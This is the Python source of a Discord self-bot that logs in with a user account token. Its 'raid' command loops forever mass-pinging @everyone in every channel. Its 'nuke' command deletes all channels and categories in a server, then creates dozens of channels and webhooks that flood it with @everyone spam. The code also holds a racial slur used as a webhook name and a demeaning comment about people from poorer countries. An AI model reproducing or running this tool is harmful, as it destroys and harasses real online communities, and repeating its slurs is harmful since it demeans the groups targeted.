import discord
from discord.ext import commands
import json
import asyncio
import aiohttp # prob wont use this but just in case

# loading in config.json :D
with open('config.json', 'r') as filerel:
    config = json.load(filerel)

penny = config['token']
ruler = config['prefix']
funnimsg = "funnied by the almighty semen gang" # make this wtv u want
# might add locale soon for you mentally unrewarded 3rd country habitants
artemis = commands.Bot(command_prefix=ruler, self_bot=True, intents=discord.Intents.all())

@artemis.event
async def on_ready():
    latency = round(artemis.latency * 1000) # setting up latency
    print(f"""
User: {artemis.user}
User ID: {artemis.user.id}
User Latency: {latency}ms
Prefix: {ruler}
Made by: Artemis
""") # just like lil funni info :)

@artemis.command()
async def raid(ctx):
    await ctx.message.delete()
    void = ctx.guild
    for channel in void.channels:
         while True:
             try:
                await channel.send(f"""
@everyone @here
{funnimsg}
""")
             except:
                 pass
               
# dont remove this
@artemis.command()
async def credits(ctx):
    await ctx.message.delete()
    await ctx.send("https://github.com/xen-artemis/simple-selfbot/")

@artemis.command()
async def spam(ctx, num: int, *, msg: str):
    await ctx.message.delete()
    for i in range(num):
        await ctx.send(msg)

@artemis.command()
async def purge(ctx):
  await ctx.message.delete()

  async for message in ctx.channel.history(limit=None):
    if ctx.author == artemis.user: # checks in channel history for messages you sent
      try:
        await message.delete() # deletes them
      except: # err handling 
        pass

@artemis.command()
async def nuke(ctx, *, text: str):
    nutmsg = f"@everyone {text}"
    void = ctx.guild
    await asyncio.gather(
        *(channel.delete() for channel in void.text_channels),
        *(channel.delete() for channel in void.voice_channels),
        *(category.delete() for category in void.categories)
    ) # ik i did this badly but im lazy
    async def funni():
        channel = await void.create_text_channel(name=text)
        webhook = await channel.create_webhook(name="niggaballs")
        for i in range(50):
            try:
                await webhook.send(nutmsg)
                await asyncio.sleep(0.3)
            except:
                asyncio.sleep(1) # if it gets ratelimited
                pass
    thenukefunni = [funni() for i in range(50)]
    await asyncio.gather(*thenukefunni)

@artemis.command(aliases=['av'])
async def avatar(ctx, user: discord.User = None):
    if user == None: # if u dont mention anybody
        user = ctx.message.author
    await ctx.send(user.avatar_url)

artemis.run(penny, bot=False)
